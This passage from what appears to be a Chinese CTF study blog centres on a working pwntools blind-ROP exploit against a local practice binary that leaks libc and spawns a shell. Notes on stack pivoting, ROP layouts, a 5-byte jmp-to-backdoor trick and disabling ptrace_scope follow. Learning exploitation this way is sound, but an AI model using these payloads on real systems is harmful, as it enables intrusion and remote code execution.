        data = leak(length, pop_rdi_ret, puts_addr, addr,stop_gadget)
        if data is None:
            continue
        else:
            result += data
        addr += len(data)
    with open('code', 'wb') as f:
        f.write(result)
```

用上面的代码将整个文件的前面的部分输出到文件，使用`ida`反编译。

需要注意的是如果泄露出来的是 “”, 那说明我们遇到了`'\x00'`，因为 `puts` 是输出字符串，字符串是以`'\x00'`为终止符的。之后利用 `ida` 打开 `binary` 模式，首先在 `edit->segments->rebase program` 将程序的基地址改为 `0x400000`，然后找到偏移 `0x560` 处。

![image-20221211230812095](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202212112308364.png)

可以看到，`puts_got`的地址是`0x601018`。这个是没问题的，但`push`那个地址本来应该是`0`，但不知道怎么变成了`0A0A00`，有两个`0`变成`a`了，这个希望有师傅解答一下。

### exp

跟着`wiki`一步一步写的，最后也是有点乱

```python
from pwn import *
from LibcSearcher import *

# sh = remote('127.0.0.1', 10001)


def get_stack_length():
    length = 0
    while True:
        try:
            sh = remote('127.0.0.1', 10001)
            payload = length*b'a'
            sh.recvuntil('password?\n')
            sh.sendline(payload)
            output = sh.recv()
            sh.close()
            if output.startswith(b'No password'):
                length += 1
                continue
        except EOFError:
            sh.close()
            success('length:' + str(length-1))
            return length - 1


def get_stop_addr(length):
    addr = 0x400600
    i = 0
    while True:
        try:
            sh = remote('127.0.0.1', 10001)
            sh.recvuntil('password?\n')
            payload = b'a'*length + p64(addr)
            sh.sendline(payload)
            sh.recv()
            sh.close()
            success('one stop gadget:0x%x' % (addr))
            return addr
        except EOFError:
            info('no 0x%x' % addr)
            addr += 1
            sh.close()


def get_brop_gadget(length, stop_gadget, addr):
    try:
        sh = remote('127.0.0.1', 10001)
        sh.recvuntil(b'password?\n')
        payload = b'a'*length + \
            p64(addr) + 6*p64(0xdeadbeaf) + \
            p64(stop_gadget) + 10*p64(stop_gadget)
        sh.sendline(payload)
        output = sh.recv(timeout=3)
        sh.close()
        info(b'output:' + output)
        if output.startswith(b'WelCome'):
            return True

    except EOFError:
        sh.close()
        return False


def check_BROP_gadgets(length, addr):
    try:
        sh = remote('127.0.0.1', 10001)
        sh.recvuntil('password?\n')
        payload = b'a'*length + p64(addr) + p64(0xdeadbeaf)*100
        sh.sendline(payload)
        output = sh.recv()
        sh.close()
        info('stop gadget, not BROP gadgets')
        return False
    except EOFError:
        sh.close()
        return True


def get_puts_addr(length, pop_rdi_ret, stop_gadget):
    addr = 0x400550
    while True:
        info(hex(addr))
        sh = remote('127.0.0.1', 10001)
        sh.recvuntil('password?\n')
        payload = b'a'*length + p64(pop_rdi_ret) + \
            p64(0x400000) + p64(addr) + p64(stop_gadget)
        sh.sendline(payload)
        try:
            content = sh.recv()
            if content.startswith(b'\x7fELF'):
                success('finding puts addr:0x%x' % addr)
                return addr
        except EOFError:
            pass
        finally:
            sh.close()
            addr += 1


def get_puts_start_addr(length, pop_rdi_ret, stop_gadget, addr):
    info('we has find put_plt, now try to find the start:')
    while True:
        info(hex(addr))
        flag1 = False
        flag2 = False
        sh = remote('127.0.0.1', 10001)
        sh.recvuntil(b'password?\n')
        payload = length*b'a' + p64(pop_rdi_ret) + \
            p64(0x400000) + p64(addr) + p64(stop_gadget)
        sh.sendline(payload)
        try:
            content1 = sh.recv(timeout=2)
            if content1.startswith(b'\x7fELF'):
                flag1 = True
        except EOFError:
            flag1 = False
        sh.close()
        sh = remote('127.0.0.1', 10001)
        sh.recvuntil(b'password?\n')
        payload = length*b'a' + p64(pop_rdi_ret) + \
            p64(0x400000) + p64(addr+6) + p64(stop_gadget)
        sh.sendline(payload)
        try:
            content2 = sh.recv(timeout=2)
            info(b'content2:' + content2)
            if content2.startswith(b'\x7fELF'):
                flag2 = True
        except EOFError:
            flag2 = False
        info('flag1:{}, flag2:{}'.format(flag1, flag2))
        if (flag1 & flag2):
            success('get the start of puts_plt addr:' + hex(addr))
            return addr
        else:
            addr += 1


def leak(length, pop_rdi_ret, puts_plt, leak_addr, stop_gadget):
    sh = remote('127.0.0.1', 10001)
    payload = length*b'a' + p64(pop_rdi_ret) + \
        p64(leak_addr) + p64(puts_plt) + p64(stop_gadget)
    sh.recvuntil('password?\n')
    sh.sendline(payload)
    try:
        data = sh.recv()
        sh.close()
        if b'WelCome' in data:
            data = data[:data.index(b"\nWelCome")]
        else:
            data = data
        if data == b"":
            data = b'\x00'
        return data
    except Exception:
        sh.close()
        info('failure in {}'.format(leak_addr))
        return None


if __name__ == '__main__':

    # length = get_stack_length()
    length = 72
    stop_gadget = 0x4006b6  # return to the start
    # stop_gadget = get_stop_addr(length)
    info('start to find brop gadgets:')
    brop_gadgets = 0x4007ba  # 0x4007ba for add rsp, 6
    '''
    while True:
        info('Testing 0x%x'%brop_gadgets)
        if get_brop_gadget(length, stop_gadget, brop_gadgets):
            if check_BROP_gadgets(brop_gadgets, length):
                success('success in finding brop gadgets: 0x%x', brop_gadgets)
                break
        else:
            brop_gadgets += 1
    '''
    pop_rdi_ret = brop_gadgets + 9
    # puts_addr = get_puts_addr(length, pop_rdi_ret, stop_gadget)
    # puts_addr = get_puts_start_addr(
    #    length, pop_rdi_ret, stop_gadget, puts_addr)
    puts_addr = 0x400560
    '''
    get puts_got
    result = b""
    addr = 0x400000
    while addr < 0x401000:
        info("starting to deal {}".format(hex(addr)))
        data = leak(length, pop_rdi_ret, puts_addr, addr,stop_gadget)
        if data is None:
            continue
        else:
            result += data
        addr += len(data)
    with open('code', 'wb') as f:
        f.write(result)
    '''

   # retn_addr = get_retn_gadget(length, stop_gadget)

    retn_addr = 0x400541
    puts_got = 0x601018
    #sh = remote('127.0.0.1', 10001)
    context(log_level='debug')
    sh = process('./brop')
    sh.recvuntil('password?\n')
    payload = length*b'a' + p64(pop_rdi_ret) + \
        p64(puts_got) + p64(retn_addr) + p64(puts_addr) + p64(stop_gadget)
    sh.sendline(payload)
    #data = sh.recvuntil(b'\nWelCome', drop=True)
    #puts_libc = u64(data.ljust(8, b'\x00'))
    puts_libc = u64(sh.recv(6).ljust(8, b'\x00'))
    libc = LibcSearcher('puts', puts_libc)
    libc_base = puts_libc - libc.dump('puts')
    system_addr = libc_base + libc.dump('system')
    str_bin_sh = libc_base + libc.dump('str_bin_sh')


    '''
    libc = ELF('./libc.so')
    libc_base = puts_libc - libc.sym['puts']
    system_addr = libc_base + libc.sym['system']
    str_bin_sh = libc_base + next(libc.search(b'/bin/sh'))
    '''

    sh.recvuntil(b'password?\n')
    payload = length*b'a' +  \
        p64(pop_rdi_ret) + p64(str_bin_sh) +  p64(system_addr) + p64(stop_gadget)
    pid = util.proc.pidof(sh)[0]
    print(pid)
    pause()
    sh.sendline(payload)
    sh.interactive()
```

## mprotect && mmap

首先是`mprotect`。

```c++
#include <unistd.h>
#include <sys/mmap.h>

int mprotect(const void *start, size_t len, int prot);
// start->起始地址
// length->长度
// prot 修改权限，有以下几个值
// PROT_EXEC 可执行 值为4
// PROT_READ 可读取 值为1
// PROT_WRITE 可写入 值为2
// PROT_NONE 不能存取

// 函数将从start开始的，长度为len的内存区的保护属性修改为prot指定的值。
// start必须是内存页的起始地址，len必须是页大小的整数倍。
// 一页是4kb也就是0x1000个字节。
```

接下来是`mmap`。

```c
#include<sys/mman.h>

void* mmap(void* start, size_t length, int prot, int flags, int fd, off_t offset);
// start->要映射到的内存区域的起始地址，设置为0或NULL，表示由内核指定
// length->要映射到的内存区域文件的大小
// prot->表示映射区域的权限 PROT_EXEC PROT_READ PROT_WRITE PROT_NONE
// READ为1，WRITE为2，EXEC为4，NONE为0
// flags->映射类型，比较复杂
// fd->文件描述符
// offset->被映射对象的起点

// 函数将一个文件映射到内存区域的一片空间，内存空间和文件二者被修改了都会改变另一个，但不是立即更新。显式同步可以使用msync()。进程不需要read()或者write()便可以对文件进行修改。mmap没有分配空间，而是将文件映射到内存，要映射的长度在调用mmap()时就已经决定，无法增加长度。
```

## 栈转移

有的情况下，栈溢出的空间很小，可能仅仅覆盖到`ebp`和`return address`，甚至没有办法构造参数，因此可以把栈迁移到其他地方。栈迁移其实主要是把`esp`放到想要放到的位置，因为像`pop`指令这种都是在栈顶也就是`esp`指向的地方操作的。栈一般可以迁移到例如`bss`段，或者是`read`进来存放到栈上的`payload`等（当然要知道存放的地址）。

汇编指令：

```assembly
leave
# 相当于两条指令：
# mov esp ebp
# pop ebp
# leave指令的作用一般是撤销栈帧，即把esp置入现在ebp的位置，再将esp的位置取出一个值当做ebp地址
ret
# 相当于pop eip，将当前esp寄存器指向的内容赋值给eip，这样接下来就会执行更新后的eip。
# 若使得栈中return address为leave ret，有以下几个过程：
# mov esp ebp 将esp收回到ebp的位置，此时二者都指向原来ebp的位置
# pop ebp     将此时二者指向的地址弹出，ebp此时指向这个地址，esp+4，指向return address即leave ret
# pop eip     esp指向的return address即leave ret弹出，接下来将再次执行leave ret，esp+4（但不管）
# mov esp ebp 将esp收回到ebp的位置，此时二者指向原来ebp的位置存放的地址
# pop ebp     将此时二者指向的地址弹出，ebp地址再次变为指向的这个值，栈迁移时可以不管ebp去哪了，esp+4.
# pop eip     已经栈迁移到这里了，执行此时esp指向的地址
```



![img](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202212091123324.png)

一般来说`payload`如下：

```python
buffer padding|fake ebp|leave ret addr|
```

构造的虚假栈帧如下如下：

```python
fake ebp
|
v
ebp2|target function addr|leave ret addr|arg1|arg2
```



## 一些栈结构的含义

- 若含有`gets`这种函数，在32位程序下可以用如下方式构造一个`/bin/sh`：

|  bss_addr  |  <- `system()`的参数

|  bss_addr  |  <-  `gets()`的参数、`system()`的返回地址

|  sys_addr  |   <-  `gets()`的返回地址 

|  gets_addr |  <-  ret_add

|    'aaaa'      |

首先栈溢出覆盖后，`ret_addr`现在是`gets()`函数的地址，而`gets()`函数的返回地址是`system()`函数的地址，下面的那个`bss_addr`便是`gets()`函数的参数（注意`gets()`函数是从I/O接收内容存到参数的地址）。`gets()`函数执行完毕后，返回到`system()`函数的地址，此时下面的`bss_addr`是`system()`函数的返回地址，而上面的`bss_addr`是`system()`函数的参数。

- 和上面同样效果的一个栈：

|        buf2        |   <-  `system()`的参数

|  0xdeadbeef  |  <-  `system()`函数的返回地址

|    system_plt   |  <- `gets()`执行完毕后执行的函数

|        buf2        |    <- `gets()`的参数

|    pop_ebx       |   <-  `gets()`的返回地址

|      gets_plt       |  <-  ret_addr

|        'aaaa'        |

同样的，对于栈溢出后执行的`gets()`函数，`pop_ebx`这个gadgets是`gets()`的返回地址，`buf2`是`gets()`函数的参数。在`gets()`函数执行完毕后，便会执行`pop_ebx`这个gadgets，因此便将`buf2`从栈里pop了出去，并继续执行栈顶，便是`system()`函数。

## 直接call输入的内容

做题的时候遇到的一个问题，先浅浅记录一下。

首先有一个后门函数：

```c
int givemeshell()
{
  __asm { endbr64 }
  return system("/bin/sh");
}
```

主函数反汇编的代码如下：

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  __int64 v3; // rbp
  __int64 v5; // [rsp-8h] [rbp-8h]

  __asm { endbr64 }
  v5 = v3;
  puts("5 bytes ni neng miao sha wo?");
  mprotect(&GLOBAL_OFFSET_TABLE_, 0x1000uLL, 7);
  gets();
  memset(&unk_40408E, 0, 0xF72uLL);
  ((void (__fastcall *)(void *, _QWORD))code)(&unk_40408E, 0LL);
  return 0;
}
```

可以看到逻辑也比较简单，将输入的部分当做函数执行，但是只能用五个字节。用汇编看其实更加直观：

```assembly
.text:000000000040125C                 mov     rdx, [rbp-8]
.text:0000000000401260                 mov     eax, 0
.text:0000000000401265                 call    rdx
```

输入的内容被放在了`rdx`，最终也是直接使用了`call rdx`指令。

相当于说是要把`rdx`处的地方当成一个函数来执行，在这个函数里面，我们理所当然的想到在`rdx`里面写`call givemeshell`，但是尝试之后发现是不行的，这里最终是使用了`jmp givemeshell`来跳转到了后门函数。这里只需要注意，`jmp`和`call`大部分情况下是相对跳转，笔者这里是调试后得到的`givemeshell`函数地址的十六进制代码，而`jmp`的十六进制代码是`0xe9`，最终五个字节为`0xffffd148e9`（只是参考一下这个十六进制的形式）完成了跳转。

## things

- `gdb`调试的结果和直接而运行的结果不一样

是有这种情况，经过自己测试发现是`gdb`调试的时候部分变量的地址和直接运行的时候不同，经查询，这个现象是由环境变量不同导致的。

- 一些Linux命令

`objdump -d` 反汇编显示特定信息

`objdump -D` 反汇编并显示多一点的信息

`gcc`：

```bash
# 编译
gcc -g -o test.o -c test.c -m32
# 链接
gcc -o test test.o -m32
```

`ldd`查看程序运行所需要的共享库。查看`libc`。

```bash
ldd ./pwn1
```

- 本地能打通，远程打不通/感觉打通了 实际不通/timeout:the monitored command....

首先排除写错了和`libc`不一样的问题。

据说是栈对齐的问题，在64位`ubuntu18`以上说是需要栈对齐？

原理上是64位下`system`函数的汇编代码中有个`movaps`指令。这个指令要求内存地址是16位对齐的。

什么叫做16位对齐？

64位下，程序地址是8字节，所以栈地址末尾要么是0，要么是8。当末尾地址是8的时候，就是没有对齐。就酱紫。所以就是要么让栈上多一个数据要么就少一条数据。

解决方式？看师傅们的做法 有两种 个人觉得第二种比较符合逻辑

第一种，直接把`system`函数的地址+1。就本来假如`system`地址是`0x401186`，我直接加一变成`0x401187`。实际上在汇编代码里面，会跳过一条指令。理想情况下就是如图所示：

![image-20221116155516405](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202211161555765.png)

这样刚好跳过了一条`push`指令，那不就...让栈上面最后少了一条指令嘛。就成功了。或许加一不行可以加多一些？具体情况最好具体分析 此处写到这里。

第二种，在调用`system`函数之前调用一个`ret`指令。`ret`指令相当于`pop rip`，也就是把栈上面`pop`一个数据出去，该数据作为接下来要执行的命令的地址。想一下，在栈溢出的时候多一个`ret`是不是无关紧要？它接下来仍然会执行`system`函数。因此可以用这种方式。

- `socat`将可执行程序绑定到本地端口：

`socat TPC4-LISTEN:[port number],fork EXEC:./[program]`

- `gdb.attach()`提示权限不对

```
Attaching to process xxxx
Could not attach to process.  If your uid matches the uid of the target
process, check the setting of /proc/sys/kernel/yama/ptrace_scope, or try
again as the root user.  For more details, see /etc/sysctl.d/10-ptrace.conf
ptrace: Operation not permitted
```

可以以`root`权限修改`/etc/sysctl.d/10-ptrace.conf`

然后`sudo sysctl -w kernel.yama.ptrace_scope=0`